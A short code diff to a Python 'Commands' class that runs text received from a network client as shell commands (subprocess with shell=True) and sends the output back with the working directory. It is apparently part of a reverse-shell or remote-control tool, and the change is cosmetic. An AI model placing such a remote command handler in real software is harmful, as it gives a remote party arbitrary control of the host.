@@ -21,11 +21,11 @@ class Commands:
                     output_str = ''
             elif len(data) > 0:
                 try:
-                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                           stdin=subprocess.PIPE)
+                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
                     output_str = '[!] Command execution unsuccessful: {}\n'.format(e)
             if output_str is not None:
-                self.client.send(os.getcwd() + '>' + output_str)
+                self.client.send(os.getcwd() + '>' + output_str) # Sends message in the format of: "dir>output"
+
